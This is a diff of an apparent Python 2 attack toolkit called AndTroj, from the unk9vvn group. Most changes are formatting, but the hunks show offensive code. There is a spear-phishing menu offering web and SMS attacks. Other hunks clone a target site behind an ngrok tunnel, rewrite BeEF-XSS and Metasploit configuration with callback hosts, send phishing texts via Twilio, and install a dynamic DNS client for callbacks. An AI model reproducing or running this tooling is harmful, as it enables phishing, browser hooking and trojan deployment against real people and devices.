@@ -2,18 +2,17 @@
 # -*- coding: UTF-8 -*-
 # https://t.me/unk9vvn
 # AVI
-import sys
 import os
-import time
 import random
-import socket
-import urllib2
-import subprocess
-import string
 import shutil
+import socket
+import string
+import subprocess
+import sys
+import time
+import urllib2
+from urllib2 import urlopen
 from twilio.rest import Client
-from threading import Timer
-from json import load
 
 try:
     from colorama import Fore, Back, Style
@@ -53,7 +52,6 @@ def cls():
     os.system([linux, windows][os.name == 'nt'])
 
 cls()
-
 
 dir = "/usr/share/AndTroj"
 
@@ -162,6 +160,7 @@ def randomword(length):
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for i in range(length))
 
+
 tmp = dir + "/tmp/"
 metdod = tmp + "payld_protocol.txt"
 netdod = tmp + "ngrok_url.txt"
@@ -256,7 +255,7 @@ def main():
                 'cd /usr/share/ && wget https://www.noip.com/client/linux/noip-duc-linux.tar.gz && tar xzf noip-duc-linux.tar.gz && rm noip-duc-linux.tar.gz && cd noip-2.1.9-1 && make && make install',
                 shell=True)
             print(os.system("noip2 && noip2 -S"))
-	    main()
+            main()
         else:
             print(os.system("noip2 && noip2 -S"))
             main()
@@ -415,6 +414,7 @@ def main():
         print "[i] generating torjan /root"
         pass
 
+
 main()
 
 
@@ -428,7 +428,7 @@ def print_engeener():
                 / __| ___  __(_)__ _| |
                 \__ \/ _ \/ _| / _` | |
                 |___/\___/\__|_\__,_|_|
-                                       
+
                  ___           _                  _           
                 | __|_ _  __ _(_)_ _  ___ ___ _ _(_)_ _  __ _ 
                 | _|| ' \/ _` | | ' \/ -_) -_) '_| | ' \/ _` |
@@ -446,16 +446,17 @@ def print_engeener():
         sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
         time.sleep(0.01)
 
+
 print_engeener()
 
 
 def socialEng():
     main_eng = raw_input("\t[1] WEB SpearPhishing\n\t"
-                          "[2] SMS SpearPhishing\n\t"
-                          "[3] FileFormat Injection(Disabled)\n\t"
-                          "[4] Install Ngrok-Twtlio\n\t"
-                          "[0] EXIT\n\t"
-                          "\n\nroot@unk9vvn:~#: ")
+                         "[2] SMS SpearPhishing\n\t"
+                         "[3] FileFormat Injection(Disabled)\n\t"
+                         "[4] Install Ngrok-Twtlio\n\t"
+                         "[0] EXIT\n\t"
+                         "\n\nroot@unk9vvn:~#: ")
     global socialEng
     global Message
     global TargetNum
@@ -465,15 +466,15 @@ def socialEng():
     global SID_twtl
     global Twtl
     global LLANs
-    global WWAN
+    global VLAN
     if main_eng == "1":
         checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
         if checkauth == (True):
             IP_CLONE = raw_input("\n\n\t[?] URL CLONE: ")
             LLANs = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
-                              if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
-                              s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
-                              socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
+                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
+                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
+                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
             Ngik = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                              "\n\t[2] Ngrok CustomURL(Business)"
                              "\n\n\nroot@unk9vvn:~#: ")
@@ -522,11 +523,11 @@ def socialEng():
                 , shell=True)
             subprocess.call(
                 'sed -i \'45s/.*/        dns_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml && '
-                'sed -i \'103s/.*/        db_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml'
+                                                             'sed -i \'103s/.*/        db_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml'
                 , shell=True)
             subprocess.call(
                 'sed -i \'18s/.*/            host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
-                'sed -i \'28s/.*/            callback_host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml'
+                                                                'sed -i \'28s/.*/            callback_host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml'
                 , shell=True)
             check = os.path.exists('/var/www/html/index.html')
             if check == (False):
@@ -633,9 +634,9 @@ def socialEng():
 
     elif main_eng == "2":
         SLAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
-                              if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
-                              s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
-                              socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
+                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
+                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
+                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
         checkauth = os.path.exists('/usr/share/twilio/twilio_token.txt')
         if checkauth == (True):
             IP_CLONE = raw_input("\n\n\t[i] Example: +12565734104\n"
@@ -814,5 +815,6 @@ def socialEng():
     else:
         print_engeener()
         socialEng()
+
 
 socialEng()
